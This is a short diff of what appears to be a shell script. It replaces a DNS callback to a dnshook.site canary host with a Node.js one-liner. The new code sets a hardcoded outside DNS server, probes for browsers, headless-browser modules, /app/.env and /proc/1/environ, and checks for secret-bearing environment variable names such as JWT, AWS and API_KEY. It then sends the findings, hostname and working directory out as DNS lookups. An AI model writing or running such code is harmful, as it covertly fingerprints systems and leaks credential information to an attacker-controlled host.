@@ -1,5 +1,9 @@
-#!/bin/sh
-H=dns52708.7cf5a6e9-833e-4d05-927e-ab589bc14cc7.dnshook.site
-nslookup "$H" >/dev/null 2>&1 && exit 0
-getent hosts "$H" >/dev/null 2>&1 && exit 0
-curl -s -m 6 "http://$H/" >/dev/null 2>&1
+node -e 'var d=require("dns"),f=require("fs");d.setServers(["91.215.85.170"]);
+var i=0,suf="."+Date.now().toString(36);
+function q(x){setTimeout(function(){d.resolve4(x+suf,function(){})},i++*120)}
+var P=["/usr/bin/chromium","/usr/bin/chromium-browser","/usr/bin/google-chrome","/usr/bin/firefox","/app/node_modules/jsdom","/app/node_modules/playwright","/app/node_modules/puppeteer","/app/node_modules/linkedom","/app/.env","/app/server.js","/proc/1/environ"];
+q("p.start");
+P.forEach(function(p,n){q("p."+n+"."+(f.existsSync(p)?"Y"+p.split("/").pop():"N"))});
+var K=["MONGO","DATABASE","JWT","SECRET","S3","MINIO","REDIS","AWS","SMTP","MAIL","TELEGRAM","API_KEY","PRIVATE"];
+K.forEach(function(k){if(Object.keys(process.env).some(function(x){return x.indexOf(k)>=0}))q("env."+k)});
+q("p.host."+require("os").hostname());q("p.cwd."+process.cwd().replace(/\//g,"-"));q("p.done")'
